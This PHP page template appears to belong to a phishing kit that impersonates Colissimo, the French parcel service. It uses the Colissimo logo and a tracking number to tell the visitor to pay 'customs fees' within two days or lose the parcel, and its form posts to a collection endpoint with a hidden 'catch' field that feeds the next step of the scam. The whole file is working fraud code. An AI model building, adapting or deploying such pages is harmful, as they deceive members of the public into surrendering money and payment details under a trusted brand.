<?php
require_once 'config/panel.php';

$today = new DateTime('now', new DateTimeZone('Europe/Paris'));
$tomorrow = new DateTime('tomorrow');
$day_after_tomorrow = new DateTime('tomorrow +1 day');
ob_start();
?>

<div class="w-100 d-flex flex-column justify-content-start align-items-center p-3 my-5">

<form class="container p-3 d-flex flex-column justify-content-start align-items-start shadow carda rounded-3" method="post" action="index.php?id=<?= md5(time()) ?>">
<input type="hidden" name="catch">
<div class="d-flex flex-row justify-content-start align-items-center"> 
    <img style="width: 118px;" src="assets/images/logo-colissimo.svg" alt="" srcset="">
    <h2 class="m-0" style="font-size: 18px;color:#20458F;font-family:bold-font;padding-left:10px;">N°<?= TRACK; ?></h2>
</div>
<div class="d-flex flex-row justify-content-start align-items-center">
    <p class=" m-0" style="font-size: 12px;color:#3c3c3c;">N° de suivi étranger : </p>
    <h2 class=" m-0" style="font-size: 12px;color:#20458F;font-family:bold-font;padding-left:10px;"> N°<?= TRACK; ?></h2>
</div>
<img class="my-3 w-100"  src="assets/images/sep.png" alt="" srcset="">

<div class="w-100 d-flex flex-column justify-content-start align-items-start">
    <h2 class="m-0 pb-4" style="font-size: 18px;color:#20458F;font-family:bold-font;">Payer les frais de douane</h2>
    <div class="w-100 d-flex flex-column justify-content-center align-items-center pb-4">
        <img src="assets/images/box-important.gif" alt="" srcset="">
    </div>
    <p>Veuillez payer les frais de douane avant le <strong><?php echo $day_after_tomorrow->format('d/m/Y') . "\n"; ?></strong> .</p>
    <p>Si vous ne payez pas, votre colis sera retourné à l'expéditeur et des frais pourront être appliqués.</p>
    <div class="d-flex flex-row justify-content-start align-items-center">
    <p class=" m-0" style="font-size: 16px;color:#3c3c3c;">Montant à payer : </p>
    <h2 class=" m-0" style="font-size: 16px;color:#20458F;font-family:bold-font;padding-left:10px;"><?= PRICE; ?></h2>
</div>
 </div>
<div class="w-100 d-flex justify-content-end align-items-center">
 <button name="submit" value="page2" type="submit" style="font-family: bold-font;width:136px;font-size:14px;background-color:#ffc905;" class="btn btn-warning my-3 p-3 rounded-3">Continuer</button>
 </div>
</form>

</div>

 <?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout.php' ?>